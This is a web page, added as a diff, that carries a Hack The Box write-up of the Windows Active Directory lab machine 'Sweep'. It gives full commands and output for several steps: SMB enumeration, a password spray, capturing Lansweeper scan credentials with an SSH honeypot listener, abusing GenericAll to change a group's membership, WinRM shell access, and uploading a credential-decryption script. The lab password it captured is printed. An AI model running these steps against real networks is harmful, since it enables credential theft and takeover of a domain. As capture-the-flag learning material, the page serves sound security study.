@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Sweep | Paracausal Telemetry</title><meta name="description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (81), SMB (445), Compromising intern." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sweep/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Sweep" /><meta property="og:description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (81), SMB (445), Compromising intern." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sweep/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sweep/og.png?v=5484a47a" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Sweep" /><meta name="twitter:description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (81), SMB (445), Compromising intern." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sweep/og.png?v=5484a47a" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Sweep","description":"Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (81), SMB (445), Compromising intern.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sweep/","datePublished":"2026-04-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Sweep","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sweep/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Sweep</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-06 · 11 min read</p><h1>Sweep</h1><p>Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (81), SMB (445), Compromising intern.</p><div class="writeup-meta"><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Sweep" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-sweep.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-sweep.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Sweep</h2><p>Sweep is a medium difficulty Windows box that involves Active Directory and Lansweeper, a technology asset intelligence tool. The attacker abuses an enabled guest account to gain access to Lansweeper, which has Map Credentials configured, which are login/password combinations…</p></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>Released</dt><dd>14 Aug 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>Yeeb</dd></div><div><dt>Rating</dt><dd>4.4 / 5</dd></div><div><dt>User owns</dt><dd>548</dd></div><div><dt>Root owns</dt><dd>525</dd></div><div><dt>User blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 23S</small></dd></div><div><dt>Root blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 23S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 385 votes from easiest to hardest"><rect x="0" y="57" width="20" height="7" rx="2" fill="hsl(96 70% 55%)"><title>15 votes</title></rect><rect x="26" y="61" width="20" height="3" rx="2" fill="hsl(96 70% 55%)"><title>6 votes</title></rect><rect x="52" y="29" width="20" height="35" rx="2" fill="hsl(80 70% 55%)"><title>73 votes</title></rect><rect x="78" y="22" width="20" height="42" rx="2" fill="hsl(70 70% 55%)"><title>89 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>135 votes</title></rect><rect x="130" y="47" width="20" height="17" rx="2" fill="hsl(38 70% 55%)"><title>35 votes</title></rect><rect x="156" y="55" width="20" height="9" rx="2" fill="hsl(28 70% 55%)"><title>19 votes</title></rect><rect x="182" y="61" width="20" height="3" rx="2" fill="hsl(16 70% 55%)"><title>7 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>3 votes</title></rect><rect x="234" y="62" width="20" height="2" rx="2" fill="hsl(0 70% 55%)"><title>3 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 5.4, Real-Life 5.3, CVE 4.0, Custom Exploitation 6.0, CTF-Like 4.7"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,72.2 145.3,98.5 126.5,132.7 85.3,144.0 78.7,99.8" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Sweep" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.234.177 --generate-hosts-file /etc/hosts         
+[sudo] password for kali: 
+SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT 10.129.234.177
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 15:21 +0000
+Nmap scan report for 10.129.234.177
+Host is up (0.014s latency).
+Not shown: 65511 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+81/tcp    open  hosts2-ns
+82/tcp    open  xfer
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+9389/tcp  open  adws
+9524/tcp  open  unknown
+49664/tcp open  unknown
+49667/tcp open  unknown
+51846/tcp open  unknown
+51847/tcp open  unknown
+59661/tcp open  unknown
+59673/tcp open  unknown
+60746/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.30 seconds</code></pre><p>Something interesting is that port 81 and 82 are open?</p><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,81,82,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,9524 -A --min-rate=2000 -sT inventory.sweep.vl
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 15:24 +0000
+Nmap scan report for inventory.sweep.vl (10.129.234.177)
+Host is up (0.014s latency).
+rDNS record for 10.129.234.177: INVENTORY.sweep.vl
+
+PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+
+81/tcp   open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-title: Lansweeper - Login
+|_Requested resource was /login.aspx
+
+82/tcp   open  ssl/xfer?
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: commonName=Lansweeper Secure Website
+| Subject Alternative Name: DNS:localhost, DNS:localhost, DNS:localhost
+| Not valid before: 2021-11-21T09:22:27
+|_Not valid after:  2121-12-21T09:22:27
+|_ssl-date: TLS randomness does not represent time
+
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-03-16 15:24:25Z)
+
+135/tcp  open  msrpc             Microsoft Windows RPC
+
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: sweep.vl, Site: Default-First-Site-Name)
+
+445/tcp  open  microsoft-ds?
+
+464/tcp  open  kpasswd5?
+
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+
+636/tcp  open  ldapssl?
+
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: sweep.vl, Site: Default-First-Site-Name)
+
+3269/tcp open  globalcatLDAPssl?
+
+3389/tcp open  ms-wbt-server     Microsoft Terminal Services
+| ssl-cert: Subject: commonName=inventory.sweep.vl
+| Not valid before: 2026-03-15T15:19:13
+|_Not valid after:  2026-09-14T15:19:13
+|_ssl-date: 2026-03-16T15:25:37+00:00; 0s from scanner time.
+
+5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+
+9389/tcp open  mc-nmf            .NET Message Framing
+
+9524/tcp open  ssl/http          Microsoft Kestrel httpd
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_ssl-date: 2026-03-16T15:25:37+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=lansweeper-server-communication
+| Subject Alternative Name: DNS:localhost, DNS:INVENTORY, DNS:inventory.sweep.vl, IP Address:192.168.115.145
+| Not valid before: 2024-02-08T19:51:08
+|_Not valid after:  3024-02-08T19:51:08
+
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: INVENTORY; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>There are some interesting ports here Interesting ports:</p><ul><li>81</li><li>82</li><li>9524</li></ul><p>So after some initial recon port 81 is a webserver for a service called lansweeper!</p><h2>HTTP (81)</h2><h3>Nuclei</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nothing found</code></pre><h3>Subdomains</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nothing found</code></pre><h3>Feroxbuster</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nothing found</code></pre><h3>Website functionality</h3><p>Landing page is a lansweeper logon page <img src="images/sweep/pasted-image-20260406002413.webp" alt="Screenshot" loading="lazy" /> Found some manual username enumeration, this error it has given me is different from other errors! No default creds and no initial version enumeration</p><h2>SMB (445)</h2><p>Null authentication is enabled but not able to use it to list shares and users</p><h3>Guest access</h3><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb inventory.sweep.vl -u &#39;Guest&#39; -p &#39;&#39; --shares
+SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\Guest: 
+SMB         10.129.234.177  445    INVENTORY        [*] Enumerated shares
+SMB         10.129.234.177  445    INVENTORY        Share           Permissions     Remark
+SMB         10.129.234.177  445    INVENTORY        -----           -----------     ------
+SMB         10.129.234.177  445    INVENTORY        ADMIN$                          Remote Admin
+SMB         10.129.234.177  445    INVENTORY        C$                              Default share
+SMB         10.129.234.177  445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
+SMB         10.129.234.177  445    INVENTORY        IPC$            READ            Remote IPC
+SMB         10.129.234.177  445    INVENTORY        Lansweeper$                     Lansweeper Actions
+SMB         10.129.234.177  445    INVENTORY        NETLOGON                        Logon server share 
+SMB         10.129.234.177  445    INVENTORY        SYSVOL                          Logon server share</code></pre><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb inventory.sweep.vl -u &#39;Guest&#39; -p &#39;&#39; --rid-brute
+SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\Guest: 
+SMB         10.129.234.177  445    INVENTORY        498: SWEEP\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        500: SWEEP\Administrator (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        501: SWEEP\Guest (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        502: SWEEP\krbtgt (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        512: SWEEP\Domain Admins (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        513: SWEEP\Domain Users (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        514: SWEEP\Domain Guests (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        515: SWEEP\Domain Computers (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        516: SWEEP\Domain Controllers (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        517: SWEEP\Cert Publishers (SidTypeAlias)
+SMB         10.129.234.177  445    INVENTORY        518: SWEEP\Schema Admins (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        519: SWEEP\Enterprise Admins (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        520: SWEEP\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        521: SWEEP\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        522: SWEEP\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        525: SWEEP\Protected Users (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        526: SWEEP\Key Admins (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        527: SWEEP\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        553: SWEEP\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.234.177  445    INVENTORY        571: SWEEP\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.177  445    INVENTORY        572: SWEEP\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.177  445    INVENTORY        1000: SWEEP\INVENTORY$ (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1101: SWEEP\DnsAdmins (SidTypeAlias)
+SMB         10.129.234.177  445    INVENTORY        1102: SWEEP\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        1103: SWEEP\Lansweeper Admins (SidTypeGroup)
+SMB         10.129.234.177  445    INVENTORY        1113: SWEEP\jgre808 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1114: SWEEP\bcla614 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1115: SWEEP\hmar648 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1116: SWEEP\jgar931 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1117: SWEEP\fcla801 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1118: SWEEP\jwil197 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1119: SWEEP\grob171 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1120: SWEEP\fdav736 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1121: SWEEP\jsmi791 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1122: SWEEP\hjoh690 (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1123: SWEEP\svc_inventory_win (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1124: SWEEP\svc_inventory_lnx (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        1125: SWEEP\intern (SidTypeUser)
+SMB         10.129.234.177  445    INVENTORY        3101: SWEEP\Lansweeper Discovery (SidTypeGroup)</code></pre><p>Ive managed to dump the users, using this ill create a user list</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat users.txt                            
+Administrator
+Guest
+krbtgt
+INVENTORY$
+jgre808
+bcla614
+hmar648
+jgar931
+fcla801
+jwil197
+grob171
+fdav736
+jsmi791
+hjoh690
+svc_inventory_win
+svc_inventory_lnx
+intern</code></pre><p>Here is the list of users So now i have some users i can try a password spray</p><h2>Compromising <code>intern</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb inventory.sweep.vl -u users.txt -p users.txt --continue-on-success
+
+SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\intern:intern</code></pre><p>I have now compromised the <code>intern</code> user This password also gets me access to the web portal on port 81 Now that im logged in i can see that the lansweeper version is <code>11.1.6.0</code> There doesnt appear to be any exploits for this version</p><h2>Abusing lansweeper scanning functionality</h2><p><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/lansweeper-security.html" target="_blank" rel="noreferrer">https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/lansweeper-security.html</a> <img src="images/sweep/pasted-image-20260406002428.webp" alt="Screenshot" loading="lazy" /> I have set this to a IP range and put my ip address as the start then ive set the SSH port to 2022 as i cant use 22 on HTB Now in the scanning creds tab i can do some more setup <img src="images/sweep/pasted-image-20260406002448.webp" alt="Screenshot" loading="lazy" /> Now the plan is to setup sshesame</p><h3>Capturing credentials</h3><p>Now ive installed sshesame via apt on my machine now ill set the config This will act as a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">server:
+  listen_address: 10.10.14.90:2022</code></pre><p>Ill add this to <code>sshesame.conf</code> in my current directory</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sshesame --config sshesame.conf
+INFO 2026/03/16 16:46:46 No host keys configured, using keys at &quot;/home/kali/.local/share/sshesame&quot;
+INFO 2026/03/16 16:46:46 Host key &quot;/home/kali/.local/share/sshesame/host_rsa_key&quot; not found, generating it
+INFO 2026/03/16 16:46:46 Host key &quot;/home/kali/.local/share/sshesame/host_ecdsa_key&quot; not found, generating it
+INFO 2026/03/16 16:46:46 Host key &quot;/home/kali/.local/share/sshesame/host_ed25519_key&quot; not found, generating it
+INFO 2026/03/16 16:46:46 Listening on 10.10.14.90:2022</code></pre><p>So now ill start the listener using the config file, then ill choose &quot;Scan Now&quot; on my IP range i made in the scanning targets tab</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">2026/03/16 16:50:21 [10.129.234.177:60099] authentication for user &quot;svc_inventory_lnx&quot; without credentials rejected
+2026/03/16 16:50:21 [10.129.234.177:60099] authentication for user &quot;svc_inventory_lnx&quot; with password &quot;0|5m-U6?/uAX&quot; accepted</code></pre><p>After a while i got a response and found some creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc_inventory_lnx:0|5m-U6?/uAX</code></pre><p>I can now test these creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap inventory.sweep.vl -u &#39;svc_inventory_lnx&#39; -p &#39;0|5m-U6?/uAX&#39;   
+LDAP        10.129.234.177  389    INVENTORY        [*] Windows Server 2022 Build 20348 (name:INVENTORY) (domain:sweep.vl) (signing:None) (channel binding:No TLS cert)
+LDAP        10.129.234.177  389    INVENTORY        [+] sweep.vl\svc_inventory_lnx:0|5m-U6?/uAX</code></pre><p>This user is now compromised</p><h3>Bloodhound</h3><p><img src="images/sweep/pasted-image-20260406002459.webp" alt="Screenshot" loading="lazy" /> This new user has some outbound object control, specifically GenericAll on the <code>lansweeper admins</code> group This means i should be able to add this current user to the <code>lansweeper admins</code> group</p><h2>Adding <code>svc_inventory_lnx</code> to the <code>lansweeper admins</code> group</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">net rpc group addmem &quot;lansweeper admins&quot; &quot;svc_inventory_lnx&quot; -U &quot;sweep.vl&quot;/&quot;svc_inventory_lnx&quot;%&#39;0|5m-U6?/uAX&#39; -S &quot;inventory.sweep.vl&quot;</code></pre><p>This should have added the user to the group but i can check with:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">net rpc group members &quot;lansweeper admins&quot; -U &quot;sweep.vl&quot;/&quot;svc_inventory_lnx&quot;%&#39;0|5m-U6?/uAX&#39; -S &quot;inventory.sweep.vl&quot; 
+SWEEP\jgre808
+SWEEP\svc_inventory_lnx</code></pre><p>I am now apart of the group</p><p><img src="images/sweep/pasted-image-20260406002509.webp" alt="Screenshot" loading="lazy" /> So this group i am now apart of is a MemberOf <code>remote management users</code> this should mean i can now get access over winrm</p><h3>Evil-winrm access as <code>svc_inventory_lnx</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i inventory.sweep.vl -u &#39;svc_inventory_lnx&#39; -p &#39;0|5m-U6?/uAX&#39;       
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_inventory_lnx\Documents&gt;</code></pre><p>I have now got a shell as this user I have tried looking for creds but they are encrpyted But i could try uploading a tool to do this</p><h2>Domain admin</h2><p><a href="https://github.com/Yeeb1/SharpLansweeperDecrypt" target="_blank" rel="noreferrer">https://github.com/Yeeb1/SharpLansweeperDecrypt</a> I can use this tool above and upload it to try and decrypt the creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\programdata&gt; upload SharpLansweeperDecrypt/LansweeperDecrypt.ps1
+                                        
+Info: Uploading /home/kali/htb/sweep/SharpLansweeperDecrypt/LansweeperDecrypt.ps1 to C:\programdata\LansweeperDecrypt.ps1
+                                        
+Data: 5700 bytes of 5700 bytes copied
+                                        
